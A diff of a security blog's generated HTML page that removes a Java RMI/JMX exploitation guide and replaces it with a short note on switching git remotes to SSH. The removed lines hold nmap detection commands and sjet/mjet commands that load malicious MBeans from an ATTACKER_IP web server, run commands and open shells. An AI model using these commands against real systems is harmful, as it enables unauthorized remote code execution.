@@ -3,15 +3,17 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="All about Java RMI techniques, methods, payloads, how/why/when they work.">
+<meta name="description" content="Updating Github Repos # Yeah, I agree. Once they removed the easy ability to push updates to a repository after cloning (over http(s)). It&rsquo;s been a nuisance to create your own or fork another, clone it, update the remotes for SSH and then get back to business. This reference is just a quick 1, 2, 3&hellip; to-do/check list of steps for ease of reference!
+Create repository on Github - Go to the website and just create one using their form, get the empty skeleton Clone repository - git clone &lt;your repo&gt; Remove remotes - git remote remove origin Add SSH remotes - git remote add origin git@github.">
 <meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Java RMI" />
-<meta property="og:description" content="All about Java RMI techniques, methods, payloads, how/why/when they work." />
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Updating a github repository after cloning" />
+<meta property="og:description" content="Updating Github Repos # Yeah, I agree. Once they removed the easy ability to push updates to a repository after cloning (over http(s)). It&rsquo;s been a nuisance to create your own or fork another, clone it, update the remotes for SSH and then get back to business. This reference is just a quick 1, 2, 3&hellip; to-do/check list of steps for ease of reference!
+Create repository on Github - Go to the website and just create one using their form, get the empty skeleton Clone repository - git clone &lt;your repo&gt; Remove remotes - git remote remove origin Add SSH remotes - git remote add origin git@github." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/java_rmi/" /><meta property="article:section" content="docs" />
-<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
-<meta property="article:modified_time" content="2022-12-10T11:35:25-05:00" />
-<title>Java RMI | Gray Hat Freelancing</title>
+<meta property="og:url" content="https://www.grayhatfreelancing.com/posts/update-github-repo/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-28T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-12-28T00:00:00+00:00" />
+<title>Updating a github repository after cloning | Gray Hat Freelancing</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
@@ -760,7 +762,7 @@ https://github.com/alex-shpak/hugo-book
   
 
   
-    <a href="/docs/java_rmi/" class="active">Java RMI</a>
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
   
 
         </li>
@@ -1099,7 +1101,7 @@ https://github.com/alex-shpak/hugo-book
     <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Java RMI</strong>
+  <strong>Updating a github repository after cloning</strong>
 
   <label for="toc-control">
     
@@ -1115,16 +1117,9 @@ https://github.com/alex-shpak/hugo-book
   
 <nav id="TableOfContents">
   <ul>
-    <li><a href="#java-rmi">Java RMI</a>
+    <li>
       <ul>
-        <li><a href="#exploitation">Exploitation</a>
-          <ul>
-            <li><a href="#requirements">Requirements</a></li>
-            <li><a href="#detection">Detection</a></li>
-            <li><a href="#remote-command-execution">Remote Command Execution</a></li>
-          </ul>
-        </li>
-        <li><a href="#references">References</a></li>
+        <li><a href="#updating-github-repos">Updating Github Repos</a></li>
       </ul>
     </li>
   </ul>
@@ -1139,72 +1134,40 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="java-rmi">
-  Java RMI
-  <a class="anchor" href="#java-rmi">#</a>
-</h1>
-<blockquote>
-<p>The attacker can host a MLet file and instruct the JMX service to load MBeans from the remote host.</p>
-</blockquote>
-<h2 id="exploitation">
-  Exploitation
-  <a class="anchor" href="#exploitation">#</a>
+<article class="markdown">
+  <h1>
+    <a href="/posts/update-github-repo/">Updating a github repository after cloning</a>
+  </h1>
+  
+  <h5>December 28, 2022</h5>
+
+
+
+  
+
+  
+
+
+
+<h2 id="updating-github-repos">
+  Updating Github Repos
+  <a class="anchor" href="#updating-github-repos">#</a>
 </h2>
-<h3 id="requirements">
-  Requirements
-  <a class="anchor" href="#requirements">#</a>
-</h3>
-<ul>
-<li>Jython</li>
-<li>The JMX server can connect to a http service that is controlled by the attacker</li>
-<li>JMX authentication is not enabled</li>
-</ul>
-<h3 id="detection">
-  Detection
-  <a class="anchor" href="#detection">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ nmap -sV --script <span style="color:#e6db74">&#34;rmi-dumpregistry or rmi-vuln-classloader&#34;</span> -p TARGET_PORT TARGET_IP -Pn -v
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1089</span>/tcp open  java-rmi Java RMI
-</span></span><span style="display:flex;"><span>| rmi-vuln-classloader:
-</span></span><span style="display:flex;"><span>|   VULNERABLE<span style="color:#960050;background-color:#1e0010">:</span>
-</span></span><span style="display:flex;"><span>|   RMI registry <span style="color:#66d9ef">default</span> <span style="color:#66d9ef">configuration</span> remote code execution vulnerability
-</span></span><span style="display:flex;"><span>|     State<span style="color:#960050;background-color:#1e0010">:</span> VULNERABLE
-</span></span><span style="display:flex;"><span>|       <span style="color:#66d9ef">Default</span> <span style="color:#66d9ef">configuration</span> of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
-</span></span><span style="display:flex;"><span>| rmi-dumpregistry<span style="color:#960050;background-color:#1e0010">:</span>
-</span></span><span style="display:flex;"><span>|   jmxrmi
-</span></span><span style="display:flex;"><span>|     javax.management.remote.rmi.RMIServerImpl_Stub
-</span></span></code></pre></div><h3 id="remote-command-execution">
-  Remote Command Execution
-  <a class="anchor" href="#remote-command-execution">#</a>
-</h3>
-<p>The attack involves the following steps:</p>
-<ul>
-<li>Starting a web server that hosts the MLet and a JAR file with the malicious MBeans</li>
-<li>Creating a instance of the MBean javax.management.loading.MLet on the target server, using JMX</li>
-<li>Invoking the &ldquo;getMBeansFromURL&rdquo; method of the MBean instance, passing the webserver URL as parameter. The JMX service will connect to the http server and parse the MLet file.</li>
-<li>The JMX service downloads and loades the JAR files that were referenced in the MLet file, making the malicious MBean available over JMX.</li>
-<li>The attacker finally invokes methods from the malicious MBean.</li>
-</ul>
-<p>Exploit the JMX using <a href="https://github.com/siberas/sjet">sjet</a> or <a href="https://github.com/mogwailabs/mjet">mjet</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>jython sjet.py TARGET_IP TARGET_PORT super_secret install http<span style="color:#960050;background-color:#1e0010">:</span>//ATTACKER_IP<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span> <span style="color:#ae81ff">8000</span>
-</span></span><span style="display:flex;"><span>jython sjet.py TARGET_IP TARGET_PORT super_secret command <span style="color:#e6db74">&#34;ls -la&#34;</span>
-</span></span><span style="display:flex;"><span>jython sjet.py TARGET_IP TARGET_PORT super_secret shell
-</span></span><span style="display:flex;"><span>jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password
-</span></span><span style="display:flex;"><span>jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall
-</span></span><span style="display:flex;"><span>jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 <span style="color:#e6db74">&#34;touch /tmp/xxx&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>jython mjet.py TARGET_IP TARGET_PORT install super_secret http<span style="color:#960050;background-color:#1e0010">:</span>//ATTACKER_IP<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span> <span style="color:#ae81ff">8000</span>
-</span></span><span style="display:flex;"><span>jython mjet.py TARGET_IP TARGET_PORT command super_secret <span style="color:#e6db74">&#34;whoami&#34;</span>
-</span></span><span style="display:flex;"><span>jython mjet.py TARGET_IP TARGET_PORT command super_secret shell
-</span></span></code></pre></div><h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
-<ul>
-<li><a href="https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/">ATTACKING RMI BASED JMX SERVICES - HANS-MARTIN MÜNCH - 28 APR 2019</a></li>
-<li><a href="https://www.exploit-db.com/docs/english/46607-jmx-rmi-%e2%80%93-multiple-applications-remote-code-execution.pdf">JMX RMI – MULTIPLE APPLICATIONS RCE - Red Timmy Security - 26th March 2019</a></li>
-</ul>
-</article>
+<p>Yeah, I agree. Once they removed the easy ability to push updates to a repository after cloning (over http(s)). It&rsquo;s been a nuisance to create your own or fork another, clone it, update the remotes for SSH and then get back to business. This reference is just a quick 1, 2, 3&hellip; to-do/check list of steps for ease of reference!</p>
+<pre tabindex="0"><code>Create repository on Github
+ - Go to the website and just create one using their form, get the empty skeleton
+Clone repository
+ - git clone &lt;your repo&gt;
+Remove remotes
+ - git remote remove origin
+Add SSH remotes
+ - git remote add origin git@github.com:m00tiny/todo-android
+   - You can combine the above two by using &#39;git remote set-url origin get@github.com:m00tiny/todo-android&#39;
+Quick commit and push
+ - git add .
+ - git commit -m &#39;.&#39;
+ - git push
+</code></pre></article>
  
       
 
@@ -1212,12 +1175,6 @@ https://github.com/alex-shpak/hugo-book
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d" title='Last modified by Stuart Gray | December 10, 2022' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>December 10, 2022</span>
-    </a>
-  </div>
 
 
 
@@ -1247,16 +1204,9 @@ https://github.com/alex-shpak/hugo-book
   
 <nav id="TableOfContents">
   <ul>
-    <li><a href="#java-rmi">Java RMI</a>
+    <li>
       <ul>
-        <li><a href="#exploitation">Exploitation</a>
-          <ul>
-            <li><a href="#requirements">Requirements</a></li>
-            <li><a href="#detection">Detection</a></li>
-            <li><a href="#remote-command-execution">Remote Command Execution</a></li>
-          </ul>
-        </li>
-        <li><a href="#references">References</a></li>
+        <li><a href="#updating-github-repos">Updating Github Repos</a></li>
       </ul>
     </li>
   </ul>
